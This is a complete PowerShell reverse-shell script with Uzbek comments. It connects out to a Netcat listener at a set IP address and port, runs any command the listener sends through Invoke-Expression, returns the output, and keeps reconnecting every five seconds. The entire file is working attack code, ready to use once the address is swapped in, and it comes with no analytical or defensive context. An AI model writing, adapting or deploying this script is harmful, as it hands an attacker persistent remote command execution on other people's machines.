$listenerIP = "192.168.1.10"   # Netcat listener IP manzili bilan almashtiring
$listenerPort = 4444           # Netcat listener porti bilan almashtiring

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($listenerIP, $listenerPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        $writer.WriteLine("PowerShell ga ulandi!")
        $writer.Flush()

        while (($command = $reader.ReadLine()) -ne "chiqish") {
            try {
                $output = Invoke-Expression -Command $command 2>&1 | Out-String
                $writer.WriteLine($output)
                $writer.Flush()
            } catch {
                $writer.WriteLine("Komandada xatolik: $_")
                $writer.Flush()
            }
        }
        
        $reader.Close()
        $writer.Close()
        $client.Close()
    } catch {
        Start-Sleep -Seconds 5
    }
}
